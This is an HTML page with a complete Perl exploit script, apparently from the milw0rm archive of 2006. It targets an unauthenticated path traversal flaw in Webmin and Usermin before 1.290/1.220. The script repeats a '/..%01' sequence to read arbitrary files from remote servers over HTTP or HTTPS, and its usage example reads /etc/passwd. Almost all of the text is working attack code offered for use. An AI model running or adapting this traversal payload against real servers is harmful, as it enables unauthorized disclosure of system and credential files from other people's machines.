<html><head><title>Webmin < 1.290 / Usermin < 1.220 Arbitrary File Disclosure Exploit (perl)</title></head><pre>#!/usr/bin/perl
#		Exploit for WEBMIN and USERMIN  less than 1.29x           
#		ARBITARY REMOTE FILE DISCLOSURE
#		WORKS FOR HTTP AND HTTPS (NOW) 		
#		Thrusday 13th  July 2006
#		Vulnerability Disclosure at securitydot.net
#		Coded by UmZ! umz32.dll@gmail.com
#		
#	
#
#		Make sure you have LWP before using this exploit.
#		USE IT AT YOUR OWN RISK
#
#		GREETS to wiseguy, Anonymous Individual, Uquali......Jhant... Fakhru... etc........................
#		for other.. like AHMED n FAIZ ... (GET A LIFE MAN).



#		Revised on Friday 14th July 2006
use LWP::Simple;
use LWP::UserAgent;
my $userag = LWP::UserAgent-&gt;new;
  
if (@ARGV &lt; 4) { 
                    print(&quot;Usage: $0 &lt;url&gt; &lt;port&gt; &lt;filename&gt; &lt;target&gt; \n&quot;); 
                    print(&quot;TARGETS are\n &quot;);
		    print(&quot;0  - &gt; HTTP \n&quot;);
		    print(&quot; 1  - &gt; HTTPS\n&quot;);
		    print(&quot;Define full path with file name \n&quot;);
		    print(&quot;Example: ./webmin.pl blah.com 10000 /etc/passwd\n&quot;);
		    exit(1); 
                    } 

                    ($target, $port,$filename, $tar) = @ARGV;

		print(&quot;WEBMIN EXPLOIT !!!!! coded by UmZ!\n&quot;);
		print(&quot;Comments and Suggestions are welcome at umz32.dll [at] gmail.com\n&quot;);
		print(&quot;Vulnerability disclose at securitydot.net\nI am just coding it in perl 'cuz I hate PHP!\n&quot;);
		print(&quot;Attacking $target on port $port!\n&quot;);
		print(&quot;FILENAME:  $filename\n&quot;);
		

		$temp=&quot;/..%01&quot; x 40;
		
		if ($tar == '0')
			{ my $url= &quot;http://&quot;. $target. &quot;:&quot; . $port .&quot;/unauthenticated/&quot;.$temp . $filename;
			$content=get $url;

			print(&quot;\n FILE CONTENT STARTED&quot;);
			print(&quot;\n -----------------------------------\n&quot;);

			print(&quot;$content&quot;);
			print(&quot;\n -------------------------------------\n&quot;);
 			}

		
		elsif ($tar == '1')
			 {
			my $url= &quot;https://&quot;. $target. &quot;:&quot; . $port .&quot;/unauthenticated/&quot;.$temp . $filename;
			my $req = HTTP::Request-&gt;new(GET =&gt; $url);
			my $res = $userag-&gt;request($req);
  			if ($res-&gt;is_success) {
   			   	print(&quot;FILE CONTENT STARTED\n&quot;);
				print(&quot;-------------------------------------------\n&quot;);
				print $res-&gt;as_string;
  				print(&quot;-------------------------------------------\n&quot;);
						}
  			else {
      			print &quot;Failed: &quot;, $res-&gt;status_line, &quot;\n&quot;;
  			     }
			}

# milw0rm.com [2006-07-15]</pre></html>